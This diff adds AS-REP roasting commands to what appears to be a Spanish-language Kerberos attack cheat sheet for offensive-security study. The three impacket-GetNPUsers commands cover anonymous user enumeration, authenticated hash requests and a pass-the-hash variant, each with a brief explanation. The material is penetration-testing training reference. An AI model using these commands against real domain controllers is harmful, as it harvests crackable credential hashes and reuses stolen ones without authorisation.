@@ -11,3 +11,18 @@
   <img src="https://img.shields.io/badge/OffSec-Kerberos_Attacks-111827?style=for-the-badge&logoColor=FF003C">
   <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
 </p>
+
+```
+impacket-getnpusers dominio.local/ -usersfile usuarios.txt -format hashcat -outputfile hashes_asrep.txt -dc-ip IP_DEL_DC
+```
+> Enumeracion anonima sin credenciales
+
+```
+impacket-getnpusers dominio.local/usuario_valido:Password123 -request -format hashcat -outputfile hashes_asrep.txt -dc-ip IP_DEL_DC
+```
+> Enumeracion con credenciales y -request Obligatorio cuando estás autenticado para indicar que deseas descargar los hashes AS-REP de los usuarios vulnerables encontrados.
+
+```
+impacket-getnpusers dominio.local/usuario_valido -hashes :HASH_NT -request -format hashcat -outputfile hashes_asrep.txt -dc-ip IP_DEL_DC
+```
+> Usando Pass-the-Hash (PtH) para la Consulta LDAP
